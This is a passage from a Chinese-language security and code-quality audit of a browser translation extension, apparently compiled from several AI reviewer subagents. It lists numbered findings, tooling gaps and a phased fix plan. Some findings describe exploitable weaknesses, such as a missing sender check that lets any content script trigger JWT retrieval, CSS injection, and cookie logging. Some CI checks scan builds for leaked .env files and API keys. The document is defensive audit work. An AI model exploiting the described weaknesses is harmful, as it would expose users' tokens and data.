| M-6 | `apps/extension/src/entrypoints/background/proxy-fetch.ts:88,168` | 完整 request/response body + cookies 进 INFO 日志（X10） | 仅 method+url+status；redact `Authorization`/`Cookie` | 否 |
| M-7 | `apps/extension/src/entrypoints/background/llm-generate-text.ts:25-33` | `backgroundGenerateText` 无 sender 校验，能被任意 content script 触发 getu-pro JWT 拉取 | sender 校验 + rate limit | 是 |
| M-8 | `apps/extension/src/entrypoints/interceptor.content/timedtext-observer.ts` | `XMLHttpRequest.prototype` 替换太宽，先在 `open` 中 URL 过滤再决定是否打 patch | 缩小到匹配的 url 才 attach load listener | 是 |
| M-9 | `apps/extension/src/components/ui/base-ui/chart.tsx:78-95` | `dangerouslySetInnerHTML` 拼 CSS 含未转义 key/color → CSS injection | sanitize 输入正则 `[^a-z0-9-]` | 是 |
| M-10 | `apps/extension/src/utils/google-drive/storage.ts:28` | 远端 Drive 文件 `JSON.parse` 后未 Zod 校验直接走 migrateConfig | 入口处 Zod parse | 是 |
| M-11 | `apps/extension/src/utils/atoms/storage-adapter.ts:28-34` | `watch` 返回 `unwatch` 但调用方常丢弃 → 累积 listener | 审计所有 `watch` 调用点 | 否 |
| M-12 | `apps/extension/src/utils/backup/storage.ts:26-37` | `for...of await getItem` 串行 N 次 chrome.storage 往返 | 改 `storage.getItems(keys)` 单次 | 否 |
| M-13 | `apps/extension/src/utils/db/dexie/app-db.ts:167-203` | 已下线的 PDF 翻译表（`pdfTranslations`、`pdfTranslationUsage`）保留在 schema v10，无清理 | v11 migration `.stores({...:null})` + `.upgrade(tx => clear)` | 是 |
| M-14 | `apps/extension/src/entrypoints/background/config.ts:6-14` | `configPromise` 失败后变 rejected，整 SW lifetime 不可恢复 | `.catch(() => { configPromise = null })` + log | 是 |
| M-15 | `apps/extension/src/entrypoints/background/db-cleanup.ts:54-64` | `alarms.onAlarm.addListener` 在 async fn 末尾注册，await 后才生效 | 改顶层同步注册 | 是 |
| M-16 | `apps/extension/src/entrypoints/background/new-user-guide.ts:13` | `onMessage("getPinState")` 每次 SW startup 重注册，无 idempotent | 模块级 once flag | 是 |
| M-17 | `apps/extension/src/entrypoints/background/analytics.ts:132-255` | `clientPromise` / `missingConfigWarned` 模块级，SW restart 即重新 init PostHog；feature flag 暂时空 | 用 `chrome.storage.session` 缓存 | 否 |
| M-18 | `apps/extension/src/utils/subtitles/fetchers/youtube/index.ts:35-63` | `postMessageRequest` 无 AbortController，调用端取消时 listener 仍存活直到 timeout | 接受 `AbortSignal` 参数 | 是 |
| M-19 | `apps/extension/src/entrypoints/interceptor.content/timedtext-observer.ts:3-4` | `timedtextUrlCache`/`timedtextUrlWaiters` 无上限，`pot` token 永驻 | LRU 上限 5；切视频清空 | 否 |
| M-20 | `apps/extension/src/entrypoints/background/iframe-injection.ts:93-100` | Firefox 无 documentId 时 dedup 完全跳过 → 双注入 | tabId+frameId+nonce 兜底 | 是 |
| M-21 | `apps/extension/src/entrypoints/subtitles.content/runtime.ts:13-19` | `hasBootstrappedSubtitlesRuntime` SW reload 后不重置 → 字幕永远不再初始化 | `ctx.onInvalidated` 内 reset | 否 |
| M-22 | `apps/extension/src/utils/host/translate/core/translation-state.ts:5` | `originalContentMap` SPA 销毁子树后无法清理，永久内存泄漏 | `stop()` 末尾 `originalContentMap.clear()`；或改 WeakMap | 否 |
| M-23 | `apps/extension/src/entrypoints/upgrade-success/main.tsx:18-43` | `closeTimer` 闭包语义脆弱；refactor 易回归 | 改 `useRef`；统一 cleanup | 是 |
| M-24 | `apps/extension/src/components/form/input-field-auto-save.tsx:32` | 每键 `void formForSubmit.handleSubmit()` 触发 storage 读+写；粘贴 40 字符 = 40 次往返 | 包 `useDebouncedValue(300-500ms)` | 是 |
| M-25 | `apps/extension/src/utils/atoms/config.ts:101` | writeQueue `.catch(() => {})` 静默；fire-and-forget caller 看不到 quota error | 至少 logger.error | 否 |
| M-26 | `apps/extension/src/components/recovery/recovery-fallback.tsx:29` | Fallback 自身用 `useAtomValue(configAtom)`；若 atom 即崩源则二次崩 | 内嵌二级 ErrorBoundary 或直接读 storage | 是 |
| M-27 | `apps/extension/src/utils/atoms/translation-state.ts:10-28` | onMount 初始 `sendMessage` 与 watch 无 race guard | 加 `didReceiveUpdate` flag | 是 |
| M-28 | `apps/extension/src/utils/backup/storage.ts:80-96` | `backup_ids` 写序列非原子，SW 中断会留下 orphan | 先写 ID list 再写数据；或一次 setItems | 是 |

---

## 6. Low 发现

| ID | 文件:行 | 简述 |
|---|---|---|
| L-1 | `apps/extension/src/entrypoints/popup/components/{review-entry-button,translate-current-pdf-button}.tsx:19,16` | `window.close()` 在固定为 tab 的场景静默 no-op；改为 tabs.getCurrent + tabs.remove |
| L-2 | `apps/extension/src/utils/atoms/{config,theme,detected-code,analytics}.ts` | 4 处直用 `console.error`，绕过项目 logger 抽象 |
| L-3 | `apps/extension/src/utils/google-drive/storage.ts:28` | 同 M-10，列出供 dedup |
| L-4 | `apps/extension/src/utils/hash.ts:1-19` | js-sha256 仅用于缓存 key（正确）；API key 等凭据未做 KDF — 文档化威胁模型 |
| L-5 | `apps/extension/src/entrypoints/background/proxy-fetch.ts:37` | `cookies.onChanged` 内 `invalidateAllCache` fire-and-forget，理论上 SW 在写入中途 evict 可能留半状态（极小） |
| L-6 | `apps/extension/src/entrypoints/background/context-menu.ts:113` | `removeAll` + `create` 非事务；中途 evict 留空菜单（MV3 平台限制，可接受） |
| L-7 | `apps/extension/src/entrypoints/side.content/index.tsx:54-58` | `side.content` 不在 iframe 跑；iframe 内 `host.content` 询问翻译状态时把 disconnect 当作 lifecycle，过宽 |
| L-8 | `apps/extension/src/entrypoints/guide.content/index.ts:20-47` | 异步 message listener 内 awaited 调用无 try/catch，非 lifecycle 错只在 console |

---

## 7. 测试与工具链 (Coverage / Tooling Gaps)

| 项 | 当前 | 推荐 |
|---|---|---|
| 默认 vitest 环境 | `node` | `jsdom`；纯工具/background fixture 用 `// @vitest-environment node` |
| Coverage 阈值 | 无 | `lines/functions ≥ 60%`，逐步抬升 |
| CI test 命令 | `pnpm test` | `pnpm test:cov` |
| TS strict | 隐式（继承 `.wxt/`） | 显式 `"strict": true`、`"noUncheckedIndexedAccess": true`、`"exactOptionalPropertyTypes": true` |
| pre-commit | `lint-staged` | + `tsc --noEmit` |
| 端到端 | 无 | Playwright + `--load-extension=output/chrome-mv3` 跑核心翻译/选项/popup 路径 |
| Manifest lint | 无 | CI 步骤 `wxt build && grep -L '"key":' output/chrome-mv3/manifest.json` |
| Source zip 内容审计 | 无 | CI `unzip -l output/*-sources.zip \| grep -v .env` |
| API key bundle 审计 | regex `WXT_.*API_KEY` | 扩展到所有 `WXT_*`；非 zip 时也跑 |
| AbortController 一致性 | 部分 | 全 LLM/网络调用都接 signal |
| Logger redaction | 无 | redact `Authorization` / `Cookie` / cookie-value / 翻译响应 body |

---

## 8. 推荐修复顺序 (Action Plan)

按 **风险/工作量比** 与 **是否 release-blocker** 排序：

### Phase 0 — release blocker (修后再发版)
1. **C-1, C-2** — 翻译 innerHTML 全部改 textContent / replaceChildren  *(预计 1-2 文件，半天)*
2. **C-3, C-4** — `backgroundFetch` / `openPage` 加 origin 白名单 + sender 校验
3. **C-5, C-12** — 翻译队列 stub handler 同步注册 + `queueReady` await
4. **C-7** — `setUpConfigBackup` 拷贝 db-cleanup 守卫
5. **C-8** — `storageAdapter.watch` callback fallback 处理 null
6. **H-1** — 移除 `includeSources: [".env.production"]`

### Phase 1 — high
7. **H-2** — `check-api-key-env` regex 扩展 + 非 zip 时也跑
8. **H-14** — Google Drive token 切到 `chrome.storage.session`（短期）；中长期改 PKCE
9. **H-9, H-10, H-11** — background SW eviction 后状态恢复（alarm fallback、iframe dedup、PDF tab 回填）
10. **H-15, H-16, H-17** — entitlements 实时同步、AbortController、document guard
11. **H-22, H-24** — MutationObserver 自递归 + guide.content postMessage 严格化
12. **H-3, H-4, H-8** — 测试基础设施（jsdom 默认、coverage 阈值、pre-commit type-check）

### Phase 2 — medium / low
13. **C-6** — 翻译队列保活 + 持久化（需要设计）
14. **C-10, M-8, M-19** — interceptor 还原 + 缩范围 + LRU
15. **M-13** — Dexie v11 migration 清理 PDF 表
16. **M-6, L-2** — logger 整理（统一抽象 + redact）
17. M-1 ~ M-28 / L-1 ~ L-8 — 见表格逐条收敛

---

## 9. 附录 — 跨评审文件

| 来源代理 | 报告文件（subagent 内部，已合入本文档） |
|---|---|
| A — Manifest/permissions/build/test | 13 个发现 (2 critical / 4 high / 5 medium / 2 low) |
| B — Background SW 生命周期 | 13 个发现 (4 critical / 4 high / 3 medium / 2 low) |
| C — Content scripts & DOM | 17 个发现 (4 critical / 5 high / 5 medium / 3 low) |
| D — Messaging & storage | 15 个发现 (3 critical / 4 high / 6 medium / 2 low) |
| E — Security | 14 个发现 (5 high / 6 medium / 3 low) |
| F — UI state / races / errors | 16 个发现 (3 critical / 6 high / 5 medium / 2 low) |
| **总计（去重后）** | **88 raw → 12 critical + 24 high + 28 medium + 8 low ≈ 72 unique** |

— *本文档由 6 个 code-reviewer 子代理并行评审产生，由主代理去重 / 合并 / 排序。未修改任何代码。*
